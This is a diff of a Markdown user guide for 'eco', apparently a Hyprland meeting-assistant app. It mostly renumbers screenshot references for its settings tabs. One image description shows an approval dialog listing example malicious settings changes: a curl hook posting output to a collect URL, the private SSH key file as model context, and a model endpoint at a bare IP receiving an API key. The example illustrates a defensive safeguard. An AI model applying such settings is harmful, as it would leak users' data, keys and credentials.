+![The reply card open: NAME "reply"; PROMPT and OUTPUT FORMAT as text areas; MODEL "default · gemini-flash"; HOOK "~/bin/post-to-notes" with what the command is run with; SEND ON ITS OWN, off.](img/47-settings-skill.png)
 
 Renaming or removing one warns that Hyprland shortcuts call skills by name.
 
 **Translation** — only the model:
 
-![Settings, 06 TRANSLATION: a sentence saying a session translates only once it is turned on in that session, on the TRANSLATION line of its details, and that here you pick the model; DEFAULT MODEL "gemini-flash"; "Translates sessions whose kind picks no translation model; on the default, the assistant's model does".](img/47-settings-translation.png)
+![Settings, 06 TRANSLATION: a sentence saying a session translates only once it is turned on in that session, on the TRANSLATION line of its details, and that here you pick the model; DEFAULT MODEL "gemini-flash"; "Translates sessions whose kind picks no translation model; on the default, the assistant's model does".](img/48-settings-translation.png)
 
 **Sessions** — the kinds, and what each runs on:
 
-![Settings, 07 SESSIONS: a sentence on the default kind and the kinds' own models; five cards — Meeting "DEFAULT · transcribes with whisper-lan · answers with gemini-flash", Conversation, Other and Idea with the same models, interview "transcribes with deepgram · answers with gemini-flash" — each with ×; ADD KIND.](img/48-settings-sessions.png)
+![Settings, 07 SESSIONS: a sentence on the default kind and the kinds' own models; five cards — Meeting "DEFAULT · transcribes with whisper-lan · answers with gemini-flash", Conversation, Other and Idea with the same models, interview "transcribes with deepgram · answers with gemini-flash" — each with ×; ADD KIND.](img/49-settings-sessions.png)
 
 The first kind is the default the start and import dialogs suggest. Open, a
 card renames the kind, makes it the default, and gives it its own
@@ -567,7 +582,7 @@ keep it.
 **Interface** — the interface language, and whether eco hides from screen
 sharing:
 
-![Settings, 08 INTERFACE: INTERFACE LANGUAGE "English (US)"; below it the unlit chip HIDE FROM SCREEN SHARING and its help: "eco's windows show black to whoever watches your shared screen. They also show black in your screenshots and recordings: Hyprland cannot tell them apart".](img/49-settings-interface.png)
+![Settings, 08 INTERFACE: INTERFACE LANGUAGE "English (US)"; below it the unlit chip HIDE FROM SCREEN SHARING and its help: "eco's windows show black to whoever watches your shared screen. They also show black in your screenshots and recordings: Hyprland cannot tell them apart".](img/50-settings-interface.png)
 
 English, Brazilian Portuguese or Japanese, or `auto` to follow the system;
 see [i18n.md](i18n.md). HIDE FROM SCREEN SHARING is off by default; on, it
@@ -578,11 +593,11 @@ error colour and the reason under it, and a dot on the tab that holds it. A
 repeated name or a space in a skill's name shows as it is typed; a missing value
 once a save is tried. The line above the buttons only counts them:
 
-![The Skills tab with a dot after "05 SKILLS"; the minutes card open and renamed "weekly minutes", its NAME field outlined in red with "No spaces: shortcuts call a skill by its name." under it, and in amber the warning that Hyprland shortcuts call a skill by its name; above CLOSE, in amber, "1 field needs fixing before saving."](img/50-settings-errors.png)
+![The Skills tab with a dot after "05 SKILLS"; the minutes card open and renamed "weekly minutes", its NAME field outlined in red with "No spaces: shortcuts call a skill by its name." under it, and in amber the warning that Hyprland shortcuts call a skill by its name; above CLOSE, in amber, "1 field needs fixing before saving."](img/51-settings-errors.png)
 
 **Closing with unsaved changes** asks:
 
-![The UNSAVED CHANGES dialog over the dimmed settings: "Your settings have unsaved changes. Save them before closing?" with SAVE AND CLOSE, KEEP EDITING and, filled red, DISCARD CHANGES.](img/51-settings-unsaved.png)
+![The UNSAVED CHANGES dialog over the dimmed settings: "Your settings have unsaved changes. Save them before closing?" with SAVE AND CLOSE, KEEP EDITING and, filled red, DISCARD CHANGES.](img/52-settings-unsaved.png)
 
 **A change another program asked for.** Only this window's own SAVE writes at
 once a new or changed skill hook, a new context file, or a new model or a
@@ -591,7 +606,7 @@ config that does (an agent, a script), the daemon holds it and every eco window
 asks, naming each hook command, each file path, and each model's address and
 where its key comes from (never the key):
 
-![The APPROVE THIS CHANGE dialog over a dimmed live session: "A program other than this window asked to change the settings. Approving saves it: a hook runs as a shell command after answers, a context file is sent to the model, and a model's key is sent to its address."; in red, "hook of minutes: curl -s --data-binary @- https://example.com/collect", "context file: ~/.ssh/id_ed25519" and "model fast: http://203.0.113.7/v1, key from $OPENROUTER_API_KEY"; REJECT and, filled red, APPROVE.](img/52-settings-pending.png)
+![The APPROVE THIS CHANGE dialog over a dimmed live session: "A program other than this window asked to change the settings. Approving saves it: a hook runs as a shell command after answers, a context file is sent to the model, and a model's key is sent to its address."; in red, "hook of minutes: curl -s --data-binary @- https://example.com/collect", "context file: ~/.ssh/id_ed25519" and "model fast: http://203.0.113.7/v1, key from $OPENROUTER_API_KEY"; REJECT and, filled red, APPROVE.](img/53-settings-pending.png)
 
 **APPROVE** saves the change; **REJECT** drops it, and the status line says it
 was rejected. Esc and a press outside do not close it. The keyboard starts on
